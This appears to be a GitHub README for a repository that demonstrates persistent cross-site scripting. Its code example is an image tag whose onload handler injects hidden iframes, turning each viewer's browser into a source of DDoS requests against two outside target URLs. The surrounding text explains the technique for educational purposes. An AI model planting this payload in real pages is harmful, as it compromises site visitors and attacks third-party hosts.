<p align="center">
  <img src="https://weplaywithfirehere.files.wordpress.com/2023/08/img_7076.jpg" alt="XSS Vulnerability Demo Logo" width="200"/>
</p>

<h1 align="center">𖤐 Persistent Cross-Site Scripting (XSS) Vulnerability Demo 𖤐</h1>

<p align="center">
  <a href="https://www.gnu.org/licenses/"><img src="https://img.shields.io/badge/License-GNU-yellow.svg" alt="License: GNU"></a>
  <a href="https://jquery.com/"><img src="https://img.shields.io/badge/jQuery-%3E%3D%203.5.1-brightgreen" alt="jQuery Version"></a>
  <a href="https://github.com/tukru/Persistent-Cross-Site-Scripting"><img src="https://img.shields.io/badge/Repo-GitHub-blue" alt="GitHub Repository"></a>
</p>

<p align="center">
  This repository contains a professional demonstration of a persistent Cross-Site Scripting (XSS) vulnerability. It illustrates how an insecure image tag can be exploited to inject malicious JavaScript code into a web page, leading to potential security risks.
</p>

---

## 𖤐 Description

The code in this repository demonstrates a common security vulnerability known as persistent Cross-Site Scripting (XSS). By not properly validating or sanitizing user input, malicious code can be injected into a web page and executed by other users who view the affected page.

## 𖤐 Code Example

```html
<img src="/imagename.jpg" onload="ddos('http://www.target1.com/1.jpg', 'http://www.target2.com/1.jpg');">
...
function ddos(url1, url2) {
  $("body").append("<iframe id='ifri_1523' style='display:none;' src='" + url1 + "'></iframe>");
  $("body").append("<iframe id='ifri_1524' style='display:none;' src='" + url2 + "'></iframe>");
}
...
```
𖤐 Methodologies and Tactics

The code leverages the onload event in an image tag to execute arbitrary JavaScript code once the image has finished loading. This code can be used to perform various malicious activities, such as launching a Distributed Denial of Service (DDoS) attack.

    Methodology: Persistent XSS attack
    Tactics: Utilizing insecure image tags, exploiting the lack of input validation and sanitization

𖤐 Disclaimer

This code is provided for educational and research purposes only. It demonstrates a known security vulnerability and should not be used maliciously or without proper authorization.
𖤐 License

This project is licensed under the GNU General Public License. See the LICENSE.md file for details.
<p align="center">
  Made with ❤️ by <a href="https://github.com/tukru">tukru</a>
</p>
